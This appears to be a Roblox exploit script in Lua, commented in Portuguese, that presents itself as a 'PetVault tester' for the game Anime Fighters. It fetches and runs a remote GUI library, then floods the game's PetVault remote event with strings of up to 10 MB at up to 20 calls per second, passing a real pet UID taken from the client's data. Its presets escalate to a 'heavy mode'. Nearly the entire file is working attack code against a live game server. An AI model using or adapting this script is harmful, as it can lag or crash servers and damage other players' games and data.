-- =====================================================
-- PETVAULT TESTER - RAYFIELD EDITION
// Carregue com: loadstring(game:HttpGet("SEU_LINK_AQUI"))()
-- =====================================================

-- Carregar Rayfield
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

-- ========== CONFIGURAÇÕES ==========
local CONFIG = {
    remoteName = "PetVault",
    pastaRemote = "Remote",
    intensidade = {
        payloadKB = 1000,
        chamadasPorSegundo = 3,
        duracaoSegundos = 20
    },
    stats = {
        chamadas = 0,
        sucessos = 0,
        falhas = 0,
        inicio = 0
    }
}

-- ========== JANELA PRINCIPAL ==========
local Window = Rayfield:CreateWindow({
    Name = "PetVault Tester - Anime Fighters",
    LoadingTitle = "Carregando...",
    LoadingSubtitle = "by Equipe de Testes",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "PetVaultTest",
        FileName = "Config"
    },
    Discord = {
        Enabled = false
    },
    KeySystem = false
})

-- ========== ABA PRINCIPAL ==========
local MainTab = Window:CreateTab("Testes", 4483362458)

-- ========== SEÇÃO DE CONTROLE ==========
local ControlSection = MainTab:CreateSection("Controles do Teste")

-- Status em tempo real
local StatusLabel = MainTab:CreateLabel("Status: <font color='#ffaa00'>Pronto</font>")

-- Botão TESTAR PETVAULT
local TestButton = MainTab:CreateButton({
    Name = "🔍 TESTAR PETVAULT",
    Callback = function()
        coroutine.wrap(testarPetVault)()
    end
})

-- Botão REJOIN
MainTab:CreateButton({
    Name = "♻️ REJOIN",
    Callback = function()
        local delay = CONFIG.intensidade.duracaoSegundos or 3
        StatusLabel:Set("Status: <font color='#ffaa00'>Rejoin em " .. delay .. "s</font>")
        wait(delay)
        game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
    end
})

-- ========== SEÇÃO DE CONFIGURAÇÃO ==========
local ConfigSection = MainTab:CreateSection("Configurações do Teste")

-- Input para nome do remote
local RemoteInput = MainTab:CreateInput({
    Name = "Nome do Remote",
    CurrentValue = "PetVault",
    PlaceholderText = "Digite o nome do remote",
    Callback = function(Value)
        CONFIG.remoteName = Value
    end
})

-- Input para pasta
local PastaInput = MainTab:CreateInput({
    Name = "Pasta do Remote",
    CurrentValue = "Remote",
    PlaceholderText = "Digite a pasta (ex: Remote)",
    Callback = function(Value)
        CONFIG.pastaRemote = Value
    end
})

-- Slider para payload (KB)
local PayloadSlider = MainTab:CreateSlider({
    Name = "Tamanho do Payload (KB)",
    Range = {10, 10000},
    Increment = 10,
    CurrentValue = 1000,
    Flag = "PayloadSize",
    Callback = function(Value)
        CONFIG.intensidade.payloadKB = Value
    end
})

-- Slider para chamadas por segundo
local CallsSlider = MainTab:CreateSlider({
    Name = "Chamadas por segundo",
    Range = {1, 20},
    Increment = 1,
    CurrentValue = 3,
    Flag = "CallsPerSecond",
    Callback = function(Value)
        CONFIG.intensidade.chamadasPorSegundo = Value
    end
})

-- Slider para duração
local DurationSlider = MainTab:CreateSlider({
    Name = "Duração (segundos)",
    Range = {5, 120},
    Increment = 5,
    CurrentValue = 20,
    Flag = "Duration",
    Callback = function(Value)
        CONFIG.intensidade.duracaoSegundos = Value
    end
})

-- ========== SEÇÃO DE PRESETS ==========
local PresetSection = MainTab:CreateSection("Modos de Teste")

-- Botão MODO LEVE
MainTab:CreateButton({
    Name = "🟢 MODO LEVE (100KB, 2 chamadas/s)",
    Callback = function()
        CONFIG.intensidade.payloadKB = 100
        CONFIG.intensidade.chamadasPorSegundo = 2
        CONFIG.intensidade.duracaoSegundos = 15
        PayloadSlider:Set(100)
        CallsSlider:Set(2)
        DurationSlider:Set(15)
        StatusLabel:Set("Status: <font color='#00ff00'>Modo LEVE ativado</font>")
    end
})

-- Botão MODO MÉDIO
MainTab:CreateButton({
    Name = "🟡 MODO MÉDIO (1000KB, 5 chamadas/s)",
    Callback = function()
        CONFIG.intensidade.payloadKB = 1000
        CONFIG.intensidade.chamadasPorSegundo = 5
        CONFIG.intensidade.duracaoSegundos = 30
        PayloadSlider:Set(1000)
        CallsSlider:Set(5)
        DurationSlider:Set(30)
        StatusLabel:Set("Status: <font color='#ffff00'>Modo MÉDIO ativado</font>")
    end
})

-- Botão MODO PESADO
MainTab:CreateButton({
    Name = "🔴 MODO PESADO (5000KB, 10 chamadas/s)",
    Callback = function()
        CONFIG.intensidade.payloadKB = 5000
        CONFIG.intensidade.chamadasPorSegundo = 10
        CONFIG.intensidade.duracaoSegundos = 45
        PayloadSlider:Set(5000)
        CallsSlider:Set(10)
        DurationSlider:Set(45)
        StatusLabel:Set("Status: <font color='#ff0000'>Modo PESADO ativado</font>")
    end
})

-- ========== SEÇÃO DE LOGS ==========
local LogSection = MainTab:CreateSection("Resultados")

local LogDisplay = MainTab:CreateParagraph({
    Title = "Log do Teste",
    Content = "Clique em TESTAR PETVAULT para começar."
})

-- ========== FUNÇÃO PRINCIPAL DE TESTE ==========
function testarPetVault()
    -- Reset stats
    CONFIG.stats.chamadas = 0
    CONFIG.stats.sucessos = 0
    CONFIG.stats.falhas = 0
    CONFIG.stats.inicio = os.clock()
    
    StatusLabel:Set("Status: <font color='#ffaa00'>Testando...</font>")
    LogDisplay:Set("🔍 Iniciando teste do PetVault...\n")
    
    -- Localizar o remote
    local remote = ReplicatedStorage
    if CONFIG.pastaRemote ~= "" then
        remote = remote:FindFirstChild(CONFIG.pastaRemote)
        if not remote then
            local erro = "❌ Pasta '" .. CONFIG.pastaRemote .. "' não encontrada!"
            LogDisplay:Set(erro)
            StatusLabel:Set("Status: <font color='#ff0000'>Erro: Pasta não encontrada</font>")
            return
        end
    end
    
    remote = remote:FindFirstChild(CONFIG.remoteName)
    if not remote then
        local erro = "❌ Remote '" .. CONFIG.remoteName .. "' não encontrado!"
        LogDisplay:Set(erro)
        StatusLabel:Set("Status: <font color='#ff0000'>Erro: Remote não encontrado</font>")
        return
    end
    
    local sucessoInicial = "✅ Remote encontrado: " .. remote:GetFullName()
    LogDisplay:Set(LogDisplay.Content .. "\n" .. sucessoInicial)
    
    -- Preparar payload
    local payload = string.rep("9", CONFIG.intensidade.payloadKB * 1024)
    local totalChamadas = CONFIG.intensidade.duracaoSegundos * CONFIG.intensidade.chamadasPorSegundo
    
    LogDisplay:Set(LogDisplay.Content .. string.format("\n📊 Configuração:\n- Payload: %dKB\n- Chamadas/s: %d\n- Duração: %ds\n- Total chamadas: %d\n", 
        CONFIG.intensidade.payloadKB,
        CONFIG.intensidade.chamadasPorSegundo,
        CONFIG.intensidade.duracaoSegundos,
        totalChamadas))
    
    -- Loop de teste
    for i = 1, totalChamadas do
        CONFIG.stats.chamadas = CONFIG.stats.chamadas + 1
        
        local sucesso, erro = pcall(function()
            -- Tenta encontrar um pet real, se falhar usa UID genérico
            local petUID = "UID_TESTE_123"
            pcall(function()
                local store = require(game.ReplicatedStorage.ModuleScripts.LocalDairebStore)
                if store then
                    local data = store.GetStoreProxy("GameData"):GetData("Pets")
                    for _, pet in pairs(data) do
                        if not pet.Locked then
                            petUID = pet.UID
                            break
                        end
                    end
                end
            end)
            
            remote:FireServer(petUID, true, payload)
        end)
        
        if sucesso then
            CONFIG.stats.sucessos = CONFIG.stats.sucessos + 1
        else
            CONFIG.stats.falhas = CONFIG.stats.falhas + 1
        end
        
        -- Atualizar status a cada 10%
        if i % math.floor(totalChamadas/10) == 0 then
            local percentual = math.floor((i/totalChamadas)*100)
            StatusLabel:Set(string.format("Status: <font color='#ffaa00'>Testando... %d%%</font>", percentual))
        end
        
        wait(1 / CONFIG.intensidade.chamadasPorSegundo)
    end
    
    -- Gerar relatório
    local elapsed = os.clock() - CONFIG.stats.inicio
    local relatorio = string.format("\n📊 RELATÓRIO FINAL\n━━━━━━━━━━━━━━━━━━\n" ..
        "Duração real: %.1fs\n" ..
        "Chamadas totais: %d\n" ..
        "✅ Sucessos: %d\n" ..
        "❌ Falhas: %d\n" ..
        "Taxa média: %.1f chamadas/s\n\n", 
        elapsed,
        CONFIG.stats.chamadas,
        CONFIG.stats.sucessos,
        CONFIG.stats.falhas,
        CONFIG.stats.chamadas / elapsed)
    
    -- Análise
    if CONFIG.stats.falhas > 0 then
        relatorio = relatorio .. "🛡️ O servidor REJEITOU " .. CONFIG.stats.falhas .. " chamadas!\n"
        if CONFIG.stats.falhas == CONFIG.stats.chamadas then
            relatorio = relatorio .. "✅ PROTEÇÃO TOTAL - Todas as chamadas foram bloqueadas!"
        else
            relatorio = relatorio .. "⚠️ PROTEÇÃO PARCIAL - Algumas chamadas passaram."
        end
    else
        relatorio = relatorio .. "❌ VULNERABILIDADE DETECTADA!\n"
        relatorio = relatorio .. "Todas as " .. CONFIG.stats.chamadas .. " chamadas foram aceitas.\n"
        relatorio = relatorio .. "O servidor NÃO está rejeitando dados grandes!"
    end
    
    LogDisplay:Set(LogDisplay.Content .. "\n" .. relatorio)
    StatusLabel:Set("Status: <font color='#00ff00'>Teste concluído</font>")
end

-- ========== NOTIFICAÇÃO INICIAL ==========
Rayfield:Notify({
    Title = "PetVault Tester",
    Content = "Script carregado! Ajuste as configurações e teste.",
    Duration = 3
})

print("✅ PetVault Tester Rayfield carregado com sucesso!")
